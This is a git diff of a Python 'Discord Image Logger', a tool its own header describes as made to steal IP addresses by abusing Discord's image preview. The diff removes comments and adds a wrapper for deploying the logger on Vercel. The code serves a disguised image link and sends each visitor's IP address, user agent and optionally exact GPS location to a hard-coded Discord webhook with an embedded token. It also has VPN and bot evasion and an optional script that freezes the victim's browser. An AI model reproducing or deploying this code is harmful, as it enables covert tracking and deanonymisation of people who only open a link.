@@ -1,6 +1,7 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
+import json
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
@@ -10,58 +11,28 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1405388071066669087/4huE8zbBO4384IzA4SpDlY5GPP7sBdfxrV_zV6Got3wGWoES48NuN2tXKCJMhI4k2SEC",
-    "image": "https://media.discordapp.net/attachments/1406968248586600499/1520507246952448251/F6AZhYcP8NEaLKyDRSVclYISiUQikUgWxoIUvTeQ30d5P6ICJDNuvwNVF15licA2MXVEFb1louQSCQSiUQSOG6KovcEFYEoFpBIJBKJRLK4KJpHv1CkkpdIJBKJ5KdhURS9RCKRSCSSnwap6CUSiUQiuYWRil4ikUgkklsYqeglEolEIrllIfofn2h6MRBmTiwAAAAASUVORK5CYII.png?ex=6a417239&is=6a4020b9&hm=a285c25cb8bb1522acba2c5a1b729b76871e77d16e88cf5af42164eda3ac49e4&=&format=webp&quality=lossless", # You can also have a custom image by using a URL argument
-                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
-
-    # CUSTOMIZATION #
-    "username": "discord", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
-
-    # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
-    
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
-
-    "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "please wait", # Message to show
-        "richMessage": True, # Enable rich text? (See README for more info)
+    "image": "https://media.discordapp.net/attachments/1406968248586600499/1520507246952448251/F6AZhYcP8NEaLKyDRSVclYISiUQikUgWxoIUvTeQ30d5P6ICJDNuvwNVF15licA2MXVEFb1louQSCQSiUQSOG6KovcEFYEoFpBIJBKJRLK4KJpHv1CkkpdIJBKJ5KdhURS9RCKRSCSSnwap6CUSiUQiuYWRil4ikUgkklsYqeglEolEIrllIfofn2h6MRBmTiwAAAAASUVORK5CYII.png?ex=6a417239&is=6a4020b9&hm=a285c25cb8bb1522acba2c5a1b729b76871e77d16e88cf5af42164eda3ac49e4&=&format=webp&quality=lossless",
+    "imageArgument": True,
+    "username": "discord",
+    "color": 0x00FFFF,
+    "crashBrowser": False,
+    "accurateLocation": False,
+    "message": {
+        "doMessage": False,
+        "message": "please wait",
+        "richMessage": True,
     },
-
-    "vpnCheck": 1, # Prevents VPNs from triggering the alert
-                # 0 = No Anti-VPN
-                # 1 = Don't ping when a VPN is suspected
-                # 2 = Don't send an alert when a VPN is suspected
-
-    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
-
-    "antiBot": 1, # Prevents bots from triggering the alert
-                # 0 = No Anti-Bot
-                # 1 = Don't ping when it's possibly a bot
-                # 2 = Don't ping when it's 100% a bot
-                # 3 = Don't send an alert when it's possibly a bot
-                # 4 = Don't send an alert when it's 100% a bot
-    
-
-    # REDIRECTION #
+    "vpnCheck": 1,
+    "linkAlerts": True,
+    "buggedImage": True,
+    "antiBot": 1,
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://media.discordapp.net/attachments/1406968248586600499/1520507246952448251/F6AZhYcP8NEaLKyDRSVclYISiUQikUgWxoIUvTeQ30d5P6ICJDNuvwNVF15licA2MXVEFb1louQSCQSiUQSOG6KovcEFYEoFpBIJBKJRLK4KJpHv1CkkpdIJBKJ5KdhURS9RCKRSCSSnwap6CUSiUQiuYWRil4ikUgkklsYqeglEolEIrllIfofn2h6MRBmTiwAAAAASUVORK5CYII.png?ex=6a417239&is=6a4020b9&hm=a285c25cb8bb1522acba2c5a1b729b76871e77d16e88cf5af42164eda3ac49e4&=&format=webp&quality=lossless" # Link to the webpage to redirect to 
+        "redirect": False,
+        "page": "https://media.discordapp.net/attachments/1406968248586600499/1520507246952448251/F6AZhYcP8NEaLKyDRSVclYISiUQikUgWxoIUvTeQ30d5P6ICJDNuvwNVF15licA2MXVEFb1louQSCQSiUQSOG6KovcEFYEoFpBIJBKJRLK4KJpHv1CkkpdIJBKJ5KdhURS9RCKRSCSSnwap6CUSiUQiuYWRil4ikUgkklsYqeglEolEIrllIfofn2h6MRBmTiwAAAAASUVORK5CYII.png?ex=6a417239&is=6a4020b9&hm=a285c25cb8bb1522acba2c5a1b729b76871e77d16e88cf5af42164eda3ac49e4&=&format=webp&quality=lossless"
     },
-
-    # Please enter all values in correct format. Otherwise, it may break.
-    # Do not edit anything below this, unless you know what you're doing.
-    # NOTE: Hierarchy tree goes as follows:
-    # 1) Redirect (If this is enabled, disables image and crash browser)
-    # 2) Crash Browser (If this is enabled, disables image)
-    # 3) Message (If this is enabled, disables image)
-    # 4) Image 
 }
 
-blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
-                                                           # This feature is undocumented mainly due to it being for detecting bots better.
+blacklistedIPs = ("27", "104", "143", "164")
 
 def botCheck(ip, useragent):
     if ip.startswith(("34", "35")):
@@ -101,7 +72,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
             "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
     ],
-}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
+}) if config["linkAlerts"] else None
         return
 
     ping = "@everyone"
@@ -164,10 +135,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **OS:** `{os}`
 > **Browser:** `{browser}`
 
-**User Agent:**
-```
-{useragent}
-```""",
+**User Agent:** `{useragent}`
     }
   ],
 }
@@ -178,9 +146,6 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 
 binaries = {
     "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
-    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
-    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
-    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
 }
 
 class ImageLoggerAPI(BaseHTTPRequestHandler):
@@ -214,11 +179,11 @@ height: 100vh;
                 return
             
             if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
-                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
-                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
-                self.end_headers() # Declare the headers as finished.
+                self.send_response(200 if config["buggedImage"] else 302)
+                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
+                self.end_headers()
 
-                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.
+                if config["buggedImage"]: self.wfile.write(binaries["loading"])
 
                 makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                 
@@ -259,13 +224,13 @@ height: 100vh;
                     data = message.encode()
                 
                 if config["crashBrowser"]:
-                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher
+                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>'
 
                 if config["redirect"]["redirect"]:
                     data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
-                self.send_response(200) # 200 = OK (HTTP Status)
-                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
-                self.end_headers() # Declare the headers as finished.
+                self.send_response(200)
+                self.send_header('Content-type', datatype)
+                self.end_headers()
 
                 if config["accurateLocation"]:
                     data += b"""<script>
@@ -298,4 +263,89 @@ if (!currenturl.includes("g=")) {
     do_GET = handleRequest
     do_POST = handleRequest
 
-handler = ImageLoggerAPI
+# Vercel handler function
+def app(environ, start_response):
+    from io import BytesIO
+    
+    # Create a request handler instance
+    class VercelHandler(BaseHTTPRequestHandler):
+        def __init__(self, environ, start_response):
+            self.environ = environ
+            self.start_response = start_response
+            self.headers_buffer = []
+            self.status_code = 200
+            self.response_body = BytesIO()
+            
+        def send_response(self, code, message=None):
+            self.status_code = code
+            
+        def send_header(self, keyword, value):
+            self.headers_buffer.append((keyword, value))
+            
+        def end_headers(self):
+            pass
+            
+        def wfile(self):
+            return self.response_body
+            
+        def finish(self):
+            status = f"{self.status_code} {'OK' if self.status_code == 200 else 'Found' if self.status_code == 302 else 'Error'}"
+            self.start_response(status, self.headers_buffer)
+            return [self.response_body.getvalue()]
+    
+    # Build path from environ
+    path = environ.get('PATH_INFO', '/')
+    query_string = environ.get('QUERY_STRING', '')
+    if query_string:
+        path = path + '?' + query_string
+    
+    # Create mock request handler
+    handler = type('MockHandler', (), {})()
+    handler.path = path
+    handler.headers = {
+        'x-forwarded-for': environ.get('HTTP_X_FORWARDED_FOR', environ.get('REMOTE_ADDR', '127.0.0.1')),
+        'user-agent': environ.get('HTTP_USER_AGENT', 'Unknown')
+    }
+    
+    # Capture response
+    output = BytesIO()
+    
+    class CapturingHandler(ImageLoggerAPI):
+        def __init__(self, request, client_address, server):
+            self.request = request
+            self.client_address = client_address
+            self.server = server
+            self.rfile = BytesIO(b'')
+            self.wfile = output
+            self.path = path
+            self.headers = type('MockHeaders', (), {
+                'get': lambda self, key, default=None: {
+                    'x-forwarded-for': handler.headers['x-forwarded-for'],
+                    'user-agent': handler.headers['user-agent']
+                }.get(key.lower(), default)
+            })()
+            
+        def send_response(self, code, message=None):
+            self.status_code = code
+            
+        def send_header(self, keyword, value):
+            self.headers_buffer.append((keyword, value))
+            
+        def end_headers(self):
+            pass
+    
+    capturing = CapturingHandler(None, None, None)
+    capturing.status_code = 200
+    capturing.headers_buffer = []
+    capturing.wfile = output
+    
+    try:
+        capturing.handleRequest()
+    except Exception as e:
+        reportError(traceback.format_exc())
+        capturing.status_code = 500
+        output.write(b'500 - Internal Server Error')
+    
+    status = f"{capturing.status_code} {'OK' if capturing.status_code == 200 else 'Found' if capturing.status_code == 302 else 'Server Error'}"
+    start_response(status, capturing.headers_buffer)
+    return [output.getvalue()]
